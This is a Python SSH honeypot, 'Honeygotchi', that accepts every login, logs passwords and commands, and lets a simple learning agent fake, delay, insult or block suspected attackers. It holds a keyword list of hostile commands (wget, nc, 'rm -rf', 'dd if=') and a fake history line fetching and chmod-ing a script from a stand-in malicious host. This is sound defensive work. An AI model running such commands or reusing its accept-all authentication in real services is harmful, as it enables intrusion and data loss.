"""Simplified Honeygotchi - SSH Honeypot with RL and Grafana Integration."""
import asyncio
import asyncssh
import json
import logging
import random
import time
import uuid
from datetime import datetime
from prometheus_client import Counter, Histogram, Gauge, start_http_server
from typing import Dict, Any


# Prometheus Metrics
SESSIONS_TOTAL = Counter('honeygotchi_sessions_total', 'Total SSH sessions', ['client_ip'])
COMMANDS_TOTAL = Counter('honeygotchi_commands_total', 'Total commands executed', ['action', 'is_malicious'])
SESSION_DURATION = Histogram('honeygotchi_session_duration_seconds', 'Session duration')
ACTIVE_SESSIONS = Gauge('honeygotchi_active_sessions', 'Currently active sessions')
RL_ACTIONS = Counter('honeygotchi_rl_actions_total', 'RL actions taken', ['action'])

# Setup logging for Grafana Loki
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s %(levelname)s %(message)s',
    handlers=[
        logging.FileHandler('/app/logs/honeygotchi.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class SimpleRLAgent:
    """Simple RL agent for dynamic responses."""
    
    def __init__(self):
        self.actions = ['ALLOW', 'DELAY', 'FAKE', 'INSULT', 'BLOCK']
        self.action_rewards = {action: 0.0 for action in self.actions}
        self.action_counts = {action: 0 for action in self.actions}
        self.epsilon = 0.3  # Exploration rate
        
    def select_action(self, command: str, session_info: Dict[str, Any]) -> str:
        """Select action based on command analysis."""
        
        # Check if command is malicious
        is_malicious = self._is_malicious(command)
        
        # Epsilon-greedy selection
        if random.random() < self.epsilon:
            # Explore: random action
            action = random.choice(self.actions)
        else:
            # Exploit: choose based on command type
            if is_malicious:
                # For malicious commands, prefer deceptive actions
                action = random.choice(['FAKE', 'INSULT', 'DELAY', 'BLOCK'])
            else:
                # For benign commands, mostly allow
                action = random.choice(['ALLOW', 'ALLOW', 'DELAY'])
        
        # Update metrics
        RL_ACTIONS.labels(action=action).inc()
        
        # Simple learning update
        self.action_counts[action] += 1
        
        return action
    
    def _is_malicious(self, command: str) -> bool:
        """Simple malicious command detection."""
        malicious_patterns = [
            'wget', 'curl', 'nc', 'netcat', 'python -c', 'bash -c',
            'base64', 'chmod +x', '/tmp/', 'rm -rf', 'dd if='
        ]
        return any(pattern in command.lower() for pattern in malicious_patterns)
    
    def update_reward(self, action: str, reward: float):
        """Update action reward (simple learning)."""
        if action in self.action_rewards:
            count = self.action_counts[action]
            if count > 0:
                old_avg = self.action_rewards[action]
                self.action_rewards[action] = old_avg + (reward - old_avg) / count


class CommandProcessor:
    """Simple command processor with fake responses."""
    
    def __init__(self):
        self.current_dir = "/home/user"
        self.fake_files = {
            "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:user:/home/user:/bin/bash\n",
            "/home/user/.bash_history": "ls\ncd /tmp\nwget http://malicious.com/script.sh\nchmod +x script.sh\n"
        }
    
    async def process_command(self, command: str, action: str) -> str:
        """Process command based on RL action."""
        
        if action == 'ALLOW':
            return await self._execute_normal(command)
        elif action == 'DELAY':
            await asyncio.sleep(2)  # Add delay
            return await self._execute_normal(command)
        elif action == 'FAKE':
            return self._generate_fake_response(command)
        elif action == 'INSULT':
            return self._generate_insult()
        elif action == 'BLOCK':
            return "Connection terminated.\n"
        else:
            return await self._execute_normal(command)
    
    async def _execute_normal(self, command: str) -> str:
        """Execute command normally."""
        parts = command.strip().split()
        if not parts:
            return ""
        
        cmd = parts[0].lower()
        
        if cmd == 'ls':
            return "documents  downloads  .bash_history  .bashrc\n"
        elif cmd == 'pwd':
            return f"{self.current_dir}\n"
        elif cmd == 'whoami':
            return "user\n"
        elif cmd == 'cat':
            if len(parts) > 1:
                file_path = parts[1]
                if file_path in self.fake_files:
                    return self.fake_files[file_path]
                else:
                    return f"cat: {file_path}: No such file or directory\n"
            return "cat: missing file operand\n"
        elif cmd == 'uname':
            return "Linux honeypot 5.4.0-generic x86_64 GNU/Linux\n"
        elif cmd in ['wget', 'curl']:
            return f"Connecting to server...\nDownload completed.\n"
        else:
            return f"{cmd}: command not found\n"
    
    def _generate_fake_response(self, command: str) -> str:
        """Generate convincing fake response."""
        if 'wget' in command or 'curl' in command:
            return "HTTP request sent, awaiting response... 200 OK\nLength: 2048 (2.0K)\nSaving to: 'malware.sh'\nmalware.sh saved [2048/2048]\n"
        elif 'chmod' in command:
            return ""  # Silent success
        elif 'python' in command:
            return "Script executed successfully.\nProcess completed.\n"
        else:
            return f"Command executed: {command}\n"
    
    def _generate_insult(self) -> str:
        """Generate insult message."""
        insults = [
            "Nice try, script kiddie! Your attacks are pathetic.",
            "Is that the best you can do? My grandmother codes better exploits.",
            "Access denied! Your IP has been reported to authorities.",
            "Seriously? Go back to hacking school.",
            "Your weak attempts are laughable. Try harder next time."
        ]
        return random.choice(insults) + "\n"


class HoneygotchiSSHSession(asyncssh.SSHServerSession):
    """SSH session handler."""
    
    def __init__(self, rl_agent: SimpleRLAgent, command_processor: CommandProcessor):
        self.rl_agent = rl_agent
        self.command_processor = command_processor
        self.session_id = str(uuid.uuid4())
        self.client_ip = None
        self.start_time = time.time()
        self.command_count = 0
        
        # Update active sessions metric
        ACTIVE_SESSIONS.inc()
        
    def connection_made(self, chan):
        """Handle connection."""
        self.chan = chan
        self.client_ip = chan.get_extra_info('peername')[0]
        
        # Log session start
        logger.info(json.dumps({
            "event": "session_start",
            "session_id": self.session_id,
            "client_ip": self.client_ip,
            "timestamp": datetime.now().isoformat()
        }))
        
        # Update metrics
        SESSIONS_TOTAL.labels(client_ip=self.client_ip).inc()
    
    def shell_requested(self):
        """Handle shell request."""
        return True
    
    def session_started(self):
        """Session started."""
        self.chan.write("Welcome to Ubuntu 20.04 LTS\n")
        self.chan.write("Last login: Mon Jan 15 10:30:22 2024\n")
        self._send_prompt()
    
    def data_received(self, data, datatype):
        """Handle received data."""
        try:
            command = data.decode('utf-8').strip()
            if command:
                asyncio.create_task(self._process_command(command))
        except UnicodeDecodeError:
            logger.warning(f"Invalid UTF-8 data from {self.client_ip}")
    
    async def _process_command(self, command: str):
        """Process command with RL."""
        self.command_count += 1
        
        # Get session info
        session_info = {
            'client_ip': self.client_ip,
            'session_id': self.session_id,
            'command_count': self.command_count
        }
        
        # RL agent selects action
        action = self.rl_agent.select_action(command, session_info)
        is_malicious = self.rl_agent._is_malicious(command)
        
        # Log command
        logger.info(json.dumps({
            "event": "command_executed",
            "session_id": self.session_id,
            "client_ip": self.client_ip,
            "command": command,
            "action": action,
            "is_malicious": is_malicious,
            "timestamp": datetime.now().isoformat()
        }))
        
        # Update metrics
        COMMANDS_TOTAL.labels(action=action, is_malicious=str(is_malicious)).inc()
        
        # Process command
        response = await self.command_processor.process_command(command, action)
        
        # Send response
        if response and action != 'BLOCK':
            self.chan.write(response)
            self._send_prompt()
        elif action == 'BLOCK':
            self.chan.write(response)
            self.chan.close()
            return
        else:
            self._send_prompt()
        
        # Simple reward calculation
        reward = 1.0 if is_malicious and action in ['FAKE', 'INSULT', 'DELAY'] else 0.5
        self.rl_agent.update_reward(action, reward)
    
    def _send_prompt(self):
        """Send command prompt."""
        self.chan.write(f"user@honeypot:{self.command_processor.current_dir}$ ")
    
    def connection_lost(self, exc):
        """Handle connection lost."""
        duration = time.time() - self.start_time
        
        # Log session end
        logger.info(json.dumps({
            "event": "session_end",
            "session_id": self.session_id,
            "client_ip": self.client_ip,
            "duration": duration,
            "commands_executed": self.command_count,
            "timestamp": datetime.now().isoformat()
        }))
        
        # Update metrics
        SESSION_DURATION.observe(duration)
        ACTIVE_SESSIONS.dec()


class HoneygotchiSSHServer(asyncssh.SSHServer):
    """SSH server for honeypot."""
    
    def __init__(self):
        self.rl_agent = SimpleRLAgent()
        self.command_processor = CommandProcessor()
    
    def connection_made(self, conn):
        """Handle new connection."""
        client_ip = conn.get_extra_info('peername')[0]
        logger.info(f"New connection from {client_ip}")
    
    def begin_auth(self, username):
        """Begin authentication."""
        return True
    
    def password_auth_supported(self):
        """Support password authentication."""
        return True
    
    def validate_password(self, username, password):
        """Validate password (always accept)."""
        logger.info(json.dumps({
            "event": "login_attempt",
            "username": username,
            "password": password,
            "timestamp": datetime.now().isoformat()
        }))
        return True
    
    def session_requested(self):
        """Create new session."""
        return HoneygotchiSSHSession(self.rl_agent, self.command_processor)


async def main():
    """Main function."""
    logger.info("Starting Honeygotchi...")
    
    # Start Prometheus metrics server
    start_http_server(9090)
    logger.info("Prometheus metrics server started on port 9090")
    
    # Start SSH honeypot
    try:
        server = await asyncssh.listen(
            host='0.0.0.0',
            port=2222,
            server_factory=HoneygotchiSSHServer,
            server_host_keys=['ssh_host_key']
        )
        
        logger.info("SSH honeypot started on port 2222")
        logger.info("Honeygotchi is ready!")
        
        # Keep running
        await server.wait_closed()
        
    except Exception as e:
        logger.error(f"Failed to start SSH server: {e}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Honeygotchi stopped")